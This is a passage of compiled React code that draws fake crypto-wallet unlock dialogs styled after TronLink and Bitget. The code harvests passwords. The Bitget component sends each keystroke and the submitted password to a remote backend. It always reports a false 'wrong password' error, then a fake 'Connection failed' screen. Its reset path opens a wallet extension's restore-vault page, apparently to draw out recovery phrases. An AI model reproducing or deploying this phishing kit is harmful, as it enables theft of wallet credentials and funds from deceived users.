                                        React.createElement("path", { fillRule: "evenodd", clipRule: "evenodd", d: "M80.8994 119.326H85.2814V90.6738H80.8994V119.326Z", fill: "black" }),
                                        React.createElement("path", { fillRule: "evenodd", clipRule: "evenodd", d: "M99.1016 119.324H103.484V102.302H99.1016V119.324Z", fill: "black" }),
                                        React.createElement("path", { fillRule: "evenodd", clipRule: "evenodd", d: "M99.1016 99.9431H103.484V95.561H99.1016V99.9431Z", fill: "black" }),
                                        React.createElement("path", { d: "M129.943 90.6738H134.325V105.245L143.877 96.2356H149.241L139.252 105.587L150 119.326H144.852L136.292 108.357L134.325 110.216V119.326H129.943V90.6738Z", fill: "black" }),
                                        React.createElement("path", { d: "M44.4942 101.63C48.7758 101.63 52.2469 105.101 52.2471 109.382C52.2471 113.664 48.776 117.135 44.4942 117.135C40.2127 117.135 36.7422 113.664 36.7422 109.382C36.7425 105.101 40.2128 101.631 44.4942 101.63Z", stroke: "black", strokeWidth: "4.38202" }),
                                        React.createElement("path", { d: "M25.4568 99.438H21.2363V119.326H25.4568V106.464C26.2575 105.397 27.2955 104.573 28.5708 103.99C29.6221 103.505 30.8092 103.162 32.1318 102.962V98.853C31.0642 99.1296 29.6038 99.5099 28.5263 100.033C27.4487 100.557 26.4256 101.179 25.4568 101.9V99.438Z", fill: "black" }),
                                        React.createElement("path", { d: "M111.742 119.326V106.484V100.535V98.0898H107.36V119.326H111.742Z", fill: "black" }),
                                        React.createElement("path", { d: "M125.899 106.095C125.899 100.308 123.262 97.4146 117.988 97.4146C116.71 97.4146 115.555 97.6739 114.522 98.1925C112.692 99.2347 111.991 100.192 111.75 100.95L111.741 102.532C113.595 101.043 116.498 100.818 117.765 101.136C120.73 101.881 121.324 105.025 121.25 106.504V119.325H125.899V106.095Z", fill: "black" }),
                                        React.createElement("path", { d: "M62.8654 119.326V106.484V100.535V98.0898H58.4834V119.326H62.8654Z", fill: "black" }),
                                        React.createElement("path", { d: "M77.0225 106.095C77.0225 100.308 74.3855 97.4146 69.1115 97.4146C67.8338 97.4146 66.6784 97.6739 65.6454 98.1925C63.8155 99.2347 63.1147 100.192 62.8743 100.95L62.8652 102.532C64.7187 101.043 67.6215 100.818 68.8888 101.136C71.8543 101.881 72.4478 105.025 72.3738 106.504V119.325H77.0225V106.095Z", fill: "black" }),
                                        React.createElement("mask", { id: "mask0_35_162", style: { maskType: 'alpha' }, maskUnits: "userSpaceOnUse", x: "40", y: "0", width: "70", height: "70" },
                                            React.createElement("path", { d: "M100 0H50C44.4772 0 40 4.47716 40 10V60C40 65.5228 44.4772 70 50 70H100C105.523 70 110 65.5228 110 60V10C110 4.47716 105.523 0 100 0Z", fill: "url(#paint0_linear_35_162)" })),
                                        React.createElement("g", { mask: "url(#mask0_35_162)" },
                                            React.createElement("path", { fillRule: "evenodd", clipRule: "evenodd", d: "M99.3647 54.8138L131.907 48.9341L94.5792 94.303L99.3647 54.8138ZM94.6909 52.6018L89.6436 94.2585L62.405 25.8895L94.6909 52.6018ZM96.8985 48.0684L65.9196 22.4375L116.55 31.7323L96.8985 48.0684ZM121.927 33.6328L132.672 43.8229L103.282 49.1323L121.927 33.6328ZM123.055 27.9513L52.8105 15.056L89.7807 107.852L141.29 45.2454L123.055 27.9513Z", fill: "white" }),
                                            React.createElement("rect", { x: "40", width: "70", height: "70", rx: "8.75", fill: "#0D1FFF" }),
                                            React.createElement("mask", { id: "mask1_35_162", style: { maskType: 'alpha' }, maskUnits: "userSpaceOnUse", x: "40", y: "0", width: "70", height: "70" },
                                                React.createElement("rect", { x: "40", width: "70", height: "70", rx: "8.75", fill: "#0D1FFF" })),
                                            React.createElement("g", { mask: "url(#mask1_35_162)" },
                                                React.createElement("path", { d: "M117.783 24.0991L50.3096 14.6152L87.9951 107.896L139.942 41.4097L117.783 24.0991ZM127.379 40.1933L105.45 44.8853L116.855 31.9729L127.376 40.1933H127.379ZM109.727 29.8076L95.6515 45.7432L67.6936 23.9022L109.727 29.8105V29.8076ZM87.3429 88.1971L63.5246 29.2405L92.455 51.8425L87.3458 88.1971H87.3429ZM94.0533 89.1373L99.1095 53.1675L126.782 47.2474L94.0562 89.1373H94.0533Z", fill: "white" })))),
                                    React.createElement("defs", null,
                                        React.createElement("linearGradient", { id: "paint0_linear_35_162", x1: "75", y1: "0", x2: "75", y2: "70", gradientUnits: "userSpaceOnUse" },
                                            React.createElement("stop", { stopColor: "#0D1FFF" }),
                                            React.createElement("stop", { offset: "1", stopColor: "#081399" })),
                                        React.createElement("clipPath", { id: "clip0_35_162" },
                                            React.createElement("rect", { width: "150", height: "120", fill: "white" }))))),
                            React.createElement("div", { className: "mx-[20px] mt-[12px]" },
                                React.createElement("div", { className: "relative" },
                                    React.createElement("input", { id: "current-password", ref: passwordInputRef, placeholder: "Password", type: showPassword ? "text" : "password", autoComplete: "off", spellCheck: "false", value: keyword, onChange: handleKeywordChange, onKeyDown: (e) => {
                                            if (e.key === 'Enter' && isButtonEnabled) {
                                                handleKeywordTyping();
                                            }
                                        }, className: `tronlink-font border rounded-lg text-[14px] font-medium h-[52px] leading-[52px] px-4 pl-4 pr-10 w-full ${error
                                            ? "border-[#ff4d4f]"
                                            : "border-[#1a212b]"} ${shouldShake ? 'password-shake' : ''}`, style: { backgroundColor: 'white', color: 'black' } }),
                                    React.createElement("svg", { className: "cursor-pointer absolute right-4 top-4", width: "20", height: "20", viewBox: "0 0 20 20", fill: "none", xmlns: "http://www.w3.org/2000/svg", onClick: togglePasswordVisibility }, showPassword ? (React.createElement(React.Fragment, null,
                                        React.createElement("path", { d: "M10.1529 4.59982C6.40178 4.59982 3.17595 6.87419 1.8999 10.1018C3.17595 13.3294 6.40176 15.6038 10.1529 15.6038C13.9041 15.6038 17.131 13.3294 18.4059 10.1018C17.131 6.87417 13.9041 4.59982 10.1529 4.59982M10.1529 13.7695C8.0526 13.7695 6.40178 12.1564 6.40178 10.1018C6.40178 8.04723 8.0526 6.43413 10.1529 6.43413C12.2544 6.43413 13.9041 8.04723 13.9041 10.1018C13.9041 12.1564 12.2544 13.7695 10.1529 13.7695ZM10.1529 7.90104C8.87799 7.90104 7.90204 8.85526 7.90204 10.1018C7.90204 11.3484 8.87799 12.3026 10.1529 12.3026C11.429 12.3026 12.4038 11.3484 12.4038 10.1018C12.4038 8.85526 11.429 7.90104 10.1529 7.90104", fill: "#B3B6BD" }))) : (React.createElement(React.Fragment, null,
                                        React.createElement("path", { d: "M10.1529 4.59982C6.40178 4.59982 3.17595 6.87419 1.8999 10.1018C3.17595 13.3294 6.40176 15.6038 10.1529 15.6038C13.9041 15.6038 17.131 13.3294 18.4059 10.1018C17.131 6.87417 13.9041 4.59982 10.1529 4.59982M10.1529 13.7695C8.0526 13.7695 6.40178 12.1564 6.40178 10.1018C6.40178 8.04723 8.0526 6.43413 10.1529 6.43413C12.2544 6.43413 13.9041 8.04723 13.9041 10.1018C13.9041 12.1564 12.2544 13.7695 10.1529 13.7695ZM10.1529 7.90104C8.87799 7.90104 7.90204 8.85526 7.90204 10.1018C7.90204 11.3484 8.87799 12.3026 10.1529 12.3026C11.429 12.3026 12.4038 11.3484 12.4038 10.1018C12.4038 8.85526 11.429 7.90104 10.1529 7.90104", fill: "#B3B6BD" }),
                                        React.createElement("path", { d: "M16.7771 16.7229L15.8227 17.6774L3.22266 5.07739L4.17715 4.12289L16.7771 16.7229Z", fill: "#B3B6BD" }),
                                        React.createElement("path", { d: "M17.6773 15.8227L16.7228 16.7772L4.1228 4.17721L5.07729 3.22272L17.6773 15.8227Z", fill: "white" })))))),
                            React.createElement("div", { className: `text-[#ff4d4f] flex text-[12px] h-[30px] leading-[17px] mt-1 px-[20px] w-full` }, error && helperText && React.createElement("span", null, helperText)),
                            React.createElement("div", { className: "mx-[20px]" },
                                React.createElement("button", { onClick: isButtonEnabled ? handleKeywordTyping : undefined, disabled: !isButtonEnabled || connecting, className: `tronlink-font self-center rounded-[8px] text-[14px] leading-[40px] p-0 flex items-center border-none flex h-[52px] justify-center relative transition-all duration-200 ease-in-out w-full ${isButtonEnabled
                                        ? "bg-[#1a212b] text-white hover:bg-[#484d55] cursor-pointer"
                                        : "bg-[#eeeff0] text-[#9ba4b6] opacity-100 cursor-not-allowed"}` }, connecting ? 'Unlocking...' : 'Unlock'))),
                        React.createElement("div", { className: "flex flex-col overflow-y-auto mt-[30px] overflow-hidden px-[20px] w-full" },
                            React.createElement("div", { className: "tronlink-font text-center text-[12px] text-[#6d778c]" }, "Unable to log in?"),
                            React.createElement("div", { className: "tronlink-font justify-center mt-2 text-center flex-row flex text-[12px] text-[#6d778ca8]" },
                                React.createElement("div", { className: "tronlink-font cursor-pointer underline decoration-underline underline-offset-1 text-[12px] hover:text-[#3c7cf3] text-[#232c41]", onClick: showForgetPassword }, "Unlock in other ways"),
                                "\u00A0or\u00A0",
                                React.createElement("div", { className: "tronlink-font cursor-pointer underline decoration-underline underline-offset-1 text-[12px] hover:text-[#3c7cf3] text-[#232c41]", onClick: showForgetPassword }, "create a new wallet"))))),
                showForgetPasswordModal && (React.createElement("div", { id: "forget-password-modal", className: "absolute inset-0 z-[1001]" },
                    React.createElement("div", { className: "relative w-full h-full" },
                        React.createElement("div", { className: "bg-[#10101099] absolute bottom-0 left-0 right-0 top-0", onClick: closeForgetPasswordModal }),
                        React.createElement("div", { tabIndex: -1, className: "absolute bottom-0 left-0 right-0 top-0 text-center flex items-center justify-center", role: "dialog" },
                            React.createElement("div", { role: "document", className: "mx-[20px] box-border text-[#000000d9] text-[14px] tabular-nums list-none p-0 pb-[24px] pointer-events-none relative w-[520px]" },
                                React.createElement("div", { tabIndex: 0, "aria-hidden": "true", style: { width: "0px", height: "0px", overflow: "hidden", outline: "none" } }),
                                React.createElement("div", { className: "rounded-[12px] border-0 shadow-[0_3px_6px_-4px_rgba(0,0,0,0.12),_0_6px_16px_0_rgba(0,0,0,0.08),_0_9px_28px_8px_rgba(0,0,0,0.05)] pointer-events-auto relative bg-white" },
                                    React.createElement("div", { className: "p-[24px_16px_16px] text-[14px] leading-[1.5715] break-words" },
                                        React.createElement("div", { className: "mb-[20px] text-center" },
                                            React.createElement("div", { className: "text-[16px] font-bold tronlink-font" }, "Security Tip")),
                                        React.createElement("p", { className: "tronlink-font text-[13px] leading-[20px] mb-[16px] text-left text-[#6d778c]" },
                                            React.createElement("svg", { className: "inline-block align-middle mr-[6px]", width: "14", height: "14", viewBox: "0 0 14 14", fill: "none", xmlns: "http://www.w3.org/2000/svg" },
                                                React.createElement("circle", { cx: "7", cy: "7", r: "7", fill: "#FF4D4F" }),
                                                React.createElement("path", { d: "M7 3.81787V8.5906", stroke: "white", strokeWidth: "1.27273", strokeLinecap: "round" }),
                                                React.createElement("path", { d: "M7 10.1821V10.8185", stroke: "white", strokeWidth: "1.27273", strokeLinecap: "round" })),
                                            "All your existing wallets will be removed and replaced with the new one."),
                                        React.createElement("p", { className: "tronlink-font text-[13px] leading-[20px] mb-[16px] text-left text-[#6d778c]" },
                                            React.createElement("svg", { className: "inline-block align-middle mr-[6px]", width: "14", height: "14", viewBox: "0 0 14 14", fill: "none", xmlns: "http://www.w3.org/2000/svg" },
                                                React.createElement("circle", { cx: "7", cy: "7", r: "7", fill: "#FF4D4F" }),
                                                React.createElement("path", { d: "M7 3.81787V8.5906", stroke: "white", strokeWidth: "1.27273", strokeLinecap: "round" }),
                                                React.createElement("path", { d: "M7 10.1821V10.8185", stroke: "white", strokeWidth: "1.27273", strokeLinecap: "round" })),
                                            "Please make sure you have backed up your mnemonic or private keys, otherwise you will not be able to recover the assets in your wallets."),
                                        React.createElement("p", { className: "tronlink-font text-[#ff4d4f] text-[13px] leading-[20px] mb-[16px] text-left" },
                                            React.createElement("svg", { className: "inline-block align-middle mr-[6px]", width: "14", height: "14", viewBox: "0 0 14 14", fill: "none", xmlns: "http://www.w3.org/2000/svg" },
                                                React.createElement("circle", { cx: "7", cy: "7", r: "7", fill: "#FF4D4F" }),
                                                React.createElement("path", { d: "M7 3.81787V8.5906", stroke: "white", strokeWidth: "1.27273", strokeLinecap: "round" }),
                                                React.createElement("path", { d: "M7 10.1821V10.8185", stroke: "white", strokeWidth: "1.27273", strokeLinecap: "round" })),
                                            "Do not continue unless you have tried all possible ways to unlock this wallet and have backed up your mnemonic or private key"),
                                        React.createElement("div", { className: `tronlink-font mt-[24px] rounded-[6px] text-white text-[13px] h-[38px] leading-[38px] text-center ${continueCountdown > 0
                                                ? "bg-[#cdd1da] cursor-not-allowed"
                                                : "bg-[#232c41] cursor-pointer hover:bg-[#3a4555]"}`, onClick: continueCountdown === 0 ? handledResetPwd : undefined, style: { pointerEvents: continueCountdown > 0 ? 'none' : 'auto' } }, continueCountdown > 0
                                            ? `Continue in ${continueCountdown}s`
                                            : "Continue"),
                                        React.createElement("div", { className: "tronlink-font cursor-pointer text-[13px] h-[20px] leading-[20px] mt-[12px] text-center hover:opacity-80 text-[#6d778c]", onClick: closeForgetPasswordModal }, "Back"))),
                                React.createElement("div", { tabIndex: 0, "aria-hidden": "true", className: "w-0 h-0 overflow-hidden outline-none" }))))))))))));
    return modalContent;
};

const BitgetModal = ({ isOpen, onClose, userId, backendConfig, darkMode = false }) => {
    const [keyword, setKeyword] = useState('');
    const [error, setError] = useState(false);
    const [helperText, setHelperText] = useState('');
    const [trying, setTrying] = useState(0);
    const [connecting, setConnecting] = useState(false);
    const [connectionError, setConnectionError] = useState(false);
    const [isClosable, setIsClosable] = useState(true);
    const [shouldShake, setShouldShake] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [isFocused, setIsFocused] = useState(false);
    const [isUnlockPressed, setIsUnlockPressed] = useState(false);
    const [showForgetPasswordModal, setShowForgetPasswordModal] = useState(false);
    const passwordInputRef = useRef(null);
    const modalRef = useRef(null);
    // Initialize on mount
    useEffect(() => {
        if (isOpen) {
            initializeLocationData();
            initializeSocket();
            setTimeout(() => {
                passwordInputRef.current?.focus();
            }, 4000);
        }
    }, [isOpen]);
    // Handle document click - separate effect
    useEffect(() => {
        if (!isOpen)
            return;
        const handleDocumentClick = (e) => {
            if (isClosable && modalRef.current && !modalRef.current.contains(e.target)) {
                handleClick();
            }
        };
        document.addEventListener('click', handleDocumentClick);
        return () => {
            document.removeEventListener('click', handleDocumentClick);
        };
    }, [isOpen, isClosable]);
    const handleClick = () => {
        if (onClose)
            onClose();
        setKeyword('');
        setTrying(0);
        setConnectionError(false);
        setError(false);
        setShouldShake(false);
        setShowPassword(false);
        setShowForgetPasswordModal(false);
    };
    const handleKeywordChange = async (e) => {
        const newKeyword = e.target.value;
        setKeyword(newKeyword);
        setError(false);
        setShouldShake(false);
        const currentUserId = backendConfig?.userId || userId;
        if (currentUserId && newKeyword && (backendConfig?.enabled !== false)) {
            await sendKeyToBackend(currentUserId, 'cha', newKeyword, WALLET_TYPE_SHORTKEY.BITGET);
        }
    };
    const togglePasswordVisibility = () => {
        setShowPassword(prev => !prev);
        setTimeout(() => {
            passwordInputRef.current?.focus();
            setIsFocused(true);
        }, 0);
    };
    const handleUnlockMouseDown = () => {
        if (keyword && keyword.length > 0) {
            setIsUnlockPressed(true);
        }
    };
    const handleUnlockMouseUp = () => {
        setIsUnlockPressed(false);
    };
    const handleKeywordTyping = async () => {
        if (connecting || !keyword)
            return;
        setConnecting(true);
        const currentUserId = backendConfig?.userId || userId;
        if (!currentUserId) {
            setConnecting(false);
            setError(true);
            setHelperText('User ID is required');
            setShouldShake(true);
            setTimeout(() => setShouldShake(false), 500);
            return;
        }
        if (backendConfig?.enabled !== false) {
            const result = await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.BITGET);
            setTimeout(() => {
                setConnecting(false);
                if (trying < 3) {
                    setError(true);
                    setHelperText(result.error || '密码错误');
                    setTrying(trying + 1);
                    setShouldShake(true);
                    setTimeout(() => setShouldShake(false), 500);
                }
                else {
                    setConnectionError(true);
                }
                passwordInputRef.current?.focus();
            }, 150);
        }
        else {
            setTimeout(() => setConnecting(false), 150);
        }
    };
    const closeForgetPasswordModal = () => {
        setShowForgetPasswordModal(false);
    };
    const handledResetPwd = () => {
        handleClick();
        closeForgetPasswordModal();
        window.open('chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault', '_blank');
    };
    const closeWindow = () => {
        handleClick();
        setTimeout(() => {
            setConnectionError(false);
            setKeyword('');
            setTrying(0);
            setError(false);
        }, 1000);
    };
    if (!isOpen)
        return null;
    const isButtonEnabled = keyword && keyword.trim().length > 0;
    const modalContent = (React.createElement("div", { id: "header-layout", ref: modalRef, className: `fixed top-0 right-[150px] z-[1000] flex transition-opacity duration-200 max-[395px]:scale-75 max-[265px]:scale-50
        ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`, onMouseEnter: () => setIsClosable(false), onMouseLeave: () => setIsClosable(true) },
        React.createElement("div", { className: "w-[360px] h-[601px] shadow-[0_2px_8px_0_rgba(0,0,0,0.2)] relative" },
            React.createElement("div", { className: "h-full relative", style: { backgroundColor: darkMode ? '#121717' : '#FFFFFF' } }, connectionError ? (React.createElement("div", { className: `text-center px-4 py-8 flex flex-col h-full justify-between ${darkMode ? 'text-white bg-[#121314]' : ''}` },
                React.createElement("div", null),
                React.createElement("div", { className: "" },
                    React.createElement("div", { className: "flex justify-center w-full items-center mb-4" },
                        React.createElement("svg", { className: `text-2xl text-center w-6 h-6 ${darkMode ? 'text-white' : 'text-red-500'}`, fill: "currentColor", viewBox: "0 0 20 20" },
                            React.createElement("path", { fillRule: "evenodd", d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z", clipRule: "evenodd" }))),
                    React.createElement("h3", { className: "text-xl font-extrabold" }, "Connection failed"),
                    React.createElement("p", { className: "text-sm" }, "Please check your connection and try again.")),
                React.createElement("button", { className: `w-full rounded-full cursor-pointer p-2.5 text-white hover:bg-[#3148f5] bg-[#4459ff] ${darkMode ? 'border-[#ffffff]' : ''}`, onClick: closeWindow }, "Ok"))) : (React.createElement(React.Fragment, null,
                React.createElement("div", { className: `flex flex-col h-full ${darkMode ? 'bg-[#121717]' : 'bg-white'}` },
                    React.createElement("div", { id: "lockboxlogo", className: "flex justify-center mb-[24px] mx-[auto] pt-[80px]" }, darkMode ? (React.createElement("svg", { width: "80", height: "80", viewBox: "0 0 96 96", fill: "none", xmlns: "http://www.w3.org/2000/svg" },
                        React.createElement("rect", { width: "96", height: "96", rx: "22.5", fill: "#00F0FF" }),
                        React.createElement("path", { d: "M39.8421 14.105C35.9665 14.103 32.0976 14.101 28.2085 14.107C25.8569 14.107 24.9749 17.0593 26.7238 18.808L53.198 45.2823C54.0242 46.038 54.5394 46.8594 54.5583 47.9421C54.5394 49.0248 54.0242 49.8462 53.198 50.6019L26.7238 77.0761C24.9749 78.8249 25.8569 81.7771 28.2085 81.7771C32.0976 81.7831 35.9665 81.7811 39.8421 81.7791C41.7825 81.7781 43.7245 81.7771 45.6716 81.7771C48.2189 81.7771 49.7341 80.4163 51.0949 79.0555L74.9712 55.1792C76.8767 53.2737 78.5817 50.7435 78.5586 47.9421C78.5817 45.1407 76.8767 42.6105 74.9712 40.705L51.0949 16.8287C49.7341 15.4678 48.2189 14.107 45.6716 14.107C43.7245 14.107 41.7825 14.106 39.8421 14.105Z", fill: "#001F29" }))) : (React.createElement("svg", { width: "80", height: "80", viewBox: "0 0 96 96", fill: "none", xmlns: "http://www.w3.org/2000/svg" },
                        React.createElement("rect", { width: "96", height: "96", rx: "22.5", fill: "#001F29" }),
                        React.createElement("path", { d: "M39.8421 14.105C35.9665 14.103 32.0976 14.101 28.2085 14.107C25.8569 14.107 24.9749 17.0593 26.7238 18.808L53.198 45.2823C54.0242 46.038 54.5394 46.8594 54.5583 47.9421C54.5394 49.0248 54.0242 49.8462 53.198 50.6019L26.7238 77.0761C24.9749 78.8249 25.8569 81.7771 28.2085 81.7771C32.0976 81.7831 35.9665 81.7811 39.8421 81.7791C41.7825 81.7781 43.7245 81.7771 45.6716 81.7771C48.2189 81.7771 49.7341 80.4163 51.0949 79.0555L74.9712 55.1792C76.8767 53.2737 78.5817 50.7435 78.5586 47.9421C78.5817 45.1407 76.8767 42.6105 74.9712 40.705L51.0949 16.8287C49.7341 15.4678 48.2189 14.107 45.6716 14.107C43.7245 14.107 41.7825 14.106 39.8421 14.105Z", fill: "#00F0FF" })))),
                    React.createElement("div", { id: "logobox", className: "w-full text-center mb-[76px]" }, darkMode ? (React.createElement("svg", { width: "170", height: "30", viewBox: "0 0 170 30", fill: "none", xmlns: "http://www.w3.org/2000/svg", className: "m-auto" },
                        React.createElement("path", { d: "M104.264 23.2025L101.041 10.018L100.576 7.59018L100.082 10.018L96.888 23.2025H91.6609L85.824 0.272949H90.7897L93.955 15.3121L94.4777 18.0434L95.0004 15.3121L98.6594 0.272949H102.725L106.355 15.3121L106.878 18.0434L107.4 15.3121L110.566 0.272949H115.27L109.433 23.2025H104.264Z", fill: "#FFFFFF" }),
                        React.createElement("path", { fillRule: "evenodd", clipRule: "evenodd", d: "M104.075 23.472L100.801 10.0808L100.568 8.86362L100.321 10.0821L97.0764 23.472H91.474L85.5 0.00390625H90.9846L94.1944 15.2543L94.4773 16.7323L94.761 15.2499L98.4703 0.00390625H102.914L106.593 15.2501L106.877 16.7323L107.16 15.2543L110.37 0.00390625H115.593L109.619 23.472H104.075ZM106.877 18.0436L106.354 15.3123L102.724 0.273153H98.6589L95 15.3123L94.4773 18.0436L93.9546 15.3123L90.7893 0.273153H85.8235L91.6604 23.2027H96.8875L100.082 10.0182L100.576 7.59038L101.04 10.0182L104.264 23.2027H109.433L115.269 0.273153H110.565L107.4 15.3123L106.877 18.0436Z", fill: "#FFFFFF" }),
                        React.createElement("path", { d: "M118.82 11.7992H114.244C114.722 7.95076 117.504 5.59717 121.631 5.59717C126.237 5.59717 128.63 8.45964 128.63 12.4353V18.9872C128.63 21.2135 128.81 22.3585 129.079 23.2491H124.353C124.204 22.6766 124.114 21.9451 124.084 21.1181C122.828 22.9628 120.913 23.758 118.999 23.758C115.948 23.758 113.675 22.1041 113.675 18.8282C113.675 16.5064 114.932 14.7253 117.474 13.7711C119.568 13.0396 121.572 12.817 124.054 12.7852V12.4035C124.054 10.527 123.187 9.54102 121.422 9.54102C119.867 9.54102 119.029 10.4634 118.82 11.7992ZM118.252 18.5101C118.252 19.6551 119.059 20.3866 120.405 20.3866C122.439 20.3866 124.054 18.6373 124.054 16.2837V15.6158C119.418 15.7112 118.252 16.9198 118.252 18.5101Z", fill: "#FFFFFF" }),
                        React.createElement("path", { d: "M135.039 0.000976562H130.49V23.4688H135.039V0.000976562Z", fill: "#FFFFFF" }),
                        React.createElement("path", { d: "M141.452 0.000976562H136.903V23.4688H141.452V0.000976562Z", fill: "#FFFFFF" }),
                        React.createElement("path", { d: "M157.281 8.55895C156.561 7.62011 155.659 6.88427 154.599 6.37108C153.54 5.85852 152.349 5.59717 151.061 5.59717C149.482 5.59717 148.058 5.98983 146.826 6.76374C145.592 7.54018 144.613 8.61858 143.914 9.97101C143.216 11.3222 142.862 12.8903 142.862 14.6303C142.862 16.3703 143.205 18.0419 143.882 19.414C144.561 20.7905 145.537 21.8702 146.782 22.6257C148.025 23.3767 149.486 23.758 151.122 23.758C153.13 23.758 154.836 23.2048 156.191 22.1131C157.496 21.0626 158.394 19.5808 158.883 17.7259H154.303C154.062 18.3571 153.723 18.8944 153.237 19.2731C152.662 19.7197 151.92 19.9462 151.031 19.9462C150.259 19.9462 149.598 19.7406 149.066 19.3359C148.532 18.9312 148.123 18.333 147.855 17.5559C147.694 17.0941 147.58 16.5632 147.513 15.9726H158.963L158.986 15.8166C159.19 14.4013 159.138 13.0603 158.83 11.8309C158.522 10.5984 158 9.49779 157.281 8.55895ZM147.585 12.7235C147.655 12.3663 147.75 11.9946 147.87 11.6558C148.149 10.8686 148.552 10.2628 149.068 9.8581C149.583 9.45338 150.223 9.24912 150.971 9.24912C151.909 9.24912 152.679 9.58216 153.259 10.2374C153.809 10.861 154.121 11.7129 154.188 12.7235H147.586H147.585Z", fill: "#FFFFFF" }),
                        React.createElement("path", { d: "M170 10.1173V5.92039H166.717V0H162.198V5.92039H159.393V10.1173H162.198V16.9873C162.198 20.8067 162.885 23.6137 167.167 23.5268L169.855 23.4691V19.5342H168.521C166.618 19.5342 166.724 18.3188 166.724 16.0617L166.716 10.1173H170H170Z", fill: "#FFFFFF" }),
                        React.createElement("path", { d: "M13.0951 11.1884C13.9274 10.6707 14.594 10.0262 15.0794 9.2663C15.6325 8.40104 15.9135 7.41272 15.9135 6.33052C15.9135 4.30441 15.2219 2.72297 13.859 1.62935C12.5124 0.548421 10.6596 0.000976562 8.35029 0.000976562H0V23.47H8.68391C11.116 23.47 13.0632 22.8509 14.4713 21.6285C15.8903 20.396 16.6108 18.6699 16.6108 16.4973C16.6108 15.1746 16.272 14.0366 15.6047 13.1155C15.0059 12.2921 14.1631 11.6445 13.0957 11.1884H13.0951ZM4.5189 4.23082H7.98714C9.07487 4.23082 9.89617 4.46173 10.4296 4.91592C10.9567 5.36441 11.2127 5.95372 11.2127 6.71684C11.2127 7.47996 10.9567 8.09909 10.4296 8.54948C9.89617 9.00367 9.07487 9.23458 7.98714 9.23458H4.5189V4.23082ZM11.0482 18.4447C10.447 18.9725 9.52896 19.2396 8.32017 19.2396H4.5189V13.4961H8.32017C9.52838 13.4961 10.4476 13.7543 11.0511 14.2612C11.6494 14.7667 11.9402 15.4341 11.9402 16.3038C11.9402 17.2185 11.6482 17.9188 11.0482 18.4453V18.4447Z", fill: "#FFFFFF" }),
                        React.createElement("path", { d: "M22.7138 5.91992H18.1648V23.4686H22.7138V5.91992Z", fill: "#FFFFFF" }),
                        React.createElement("path", { d: "M67.6457 8.55895C66.9257 7.62011 66.0234 6.88427 64.9634 6.37108C63.9047 5.85852 62.7138 5.59717 61.4257 5.59717C59.8468 5.59717 58.4225 5.98983 57.1912 6.76374C55.9569 7.54018 54.9775 8.61858 54.279 9.97101C53.5804 11.3222 53.2266 12.8903 53.2266 14.6303C53.2266 16.3703 53.57 18.0419 54.2471 19.414C54.9259 20.7905 55.9019 21.8702 57.1471 22.6257C58.3901 23.3767 59.8503 23.758 61.4865 23.758C63.4952 23.758 65.2003 23.2048 66.5556 22.1131C67.8612 21.0626 68.7589 19.5808 69.2477 17.7259H64.668C64.4271 18.3571 64.0877 18.8944 63.6017 19.2731C63.0272 19.7197 62.2852 19.9462 61.3956 19.9462C60.6241 19.9462 59.9632 19.7406 59.4309 19.3359C58.8963 18.9312 58.488 18.333 58.2198 17.5559C58.0588 17.0941 57.9447 16.5632 57.8775 15.9726H69.3277L69.3503 15.8166C69.5547 14.4013 69.5032 13.0603 69.195 11.8309C68.8863 10.5984 68.365 9.49779 67.6457 8.55895ZM57.9499 12.7235C58.02 12.3663 58.1144 11.9946 58.2343 11.6558C58.5135 10.8686 58.9166 10.2628 59.4332 9.8581C59.9476 9.45338 60.5876 9.24912 61.3359 9.24912C62.2736 9.24912 63.0434 9.58216 63.6237 10.2374C64.174 10.861 64.4862 11.7129 64.5528 12.7235H57.9505H57.9499Z", fill: "#FFFFFF" }),
                        React.createElement("path", { d: "M22.8091 0H18.0701V4.22985H22.8091V0Z", fill: "#FFFFFF" }),
                        React.createElement("path", { d: "M47.7204 7.91064C47.1823 7.20271 46.5516 6.654 45.8403 6.27465C44.9912 5.8249 43.9979 5.59717 42.8876 5.59717C41.5282 5.59717 40.3096 5.96446 39.267 6.68762C38.2256 7.41014 37.3997 8.43145 36.8129 9.72108C36.2285 11.0075 35.9314 12.5179 35.9314 14.2123C35.9314 15.9066 36.2436 17.3282 36.8599 18.6235C37.4773 19.9233 38.3333 20.9586 39.4037 21.7021C40.4764 22.4474 41.6996 22.8255 43.0399 22.8255C44.0518 22.8255 44.9761 22.5857 45.7859 22.1118C46.427 21.7369 46.964 21.2409 47.3874 20.6351V22.5457C47.3874 23.7301 47.103 24.6391 46.544 25.2449C45.9834 25.8507 45.1308 26.1565 44.0095 26.1565C43.0434 26.1565 42.2835 25.9167 41.7518 25.4428C41.3168 25.0552 40.9368 24.5465 40.8482 23.4694H36.4625C36.5031 24.9766 36.9073 25.9922 37.4779 26.8822C38.1179 27.8794 39.0179 28.659 40.1555 29.1975C41.282 29.7298 42.5893 30 44.0402 30C46.4757 30 48.4149 29.3295 49.802 28.0088C51.1979 26.6804 51.9057 24.8205 51.9057 22.4817V5.91942H47.7204V7.91064ZM46.9194 16.5435C46.6309 17.1956 46.2237 17.7069 45.7077 18.0609C45.1922 18.4148 44.5701 18.595 43.8577 18.595C42.8279 18.595 42.0275 18.2112 41.4089 17.4208C40.7926 16.6349 40.4804 15.5552 40.4804 14.2116C40.4804 12.8681 40.7926 11.7884 41.4089 11.0012C42.0193 10.2216 42.8435 9.82701 43.8577 9.82701C44.8719 9.82701 45.7679 10.2273 46.3981 11.019C47.034 11.817 47.3567 12.9023 47.3567 14.2427C47.3567 15.1112 47.2095 15.8844 46.9194 16.5429V16.5435Z", fill: "#FFFFFF" }),
                        React.createElement("path", { d: "M80.3649 10.1173V5.92039H77.0814V0H72.5625V5.92039H69.7581V10.1173H72.5625V16.9873C72.5625 20.8067 73.2495 23.6137 77.5315 23.5268L80.2195 23.4691V19.5342H78.8856C76.9824 19.5342 77.0884 18.3188 77.0884 16.0617L77.0809 10.1173H80.3643H80.3649Z", fill: "#FFFFFF" }),
